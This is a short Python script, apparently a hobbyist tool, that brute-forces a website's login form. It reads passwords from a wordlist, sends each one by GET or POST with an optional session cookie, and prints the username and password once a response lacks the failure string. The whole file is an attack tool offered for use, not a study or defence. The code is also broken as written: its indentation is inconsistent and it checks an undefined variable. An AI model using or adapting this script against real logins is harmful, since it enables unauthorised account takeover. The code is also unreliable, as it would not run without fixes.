import requests

url = input('[+] Enter page URL: ')
username = input('[+] Enter username for the account to bruteforce: ')
password_file = input('[+] Enter password file to use(path): ')
login_failed_string = input('[+] Enter string that occurs when login fails: ')
cookie_value = input('Enter cookie value(optional/must be specified if withing a session): ')

def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print('Trying: ' + password)
		data = {'username':username,'password':password,'Login':'submit'} #change values in purple as per page info
                if cookie != '':
                        response = requests.get(url, params={'username':username,'password':password,'Login':'submit'}, cookies = {'Cookie': cookie_value})#The .get() might be needed to be changed per page ex. .post(), change param names per page
                else:
                        response = requests.post(url, data = data)
                if login_failed_string in response.content.decode():
                        pass
                else:
                        print('[+] Username found: ' + username)
                        print('[+] Password found: ' + password)
                        exit()

with open(password_file, 'r') as passwords:
	cracking(username,url)
print('Password not in list!')
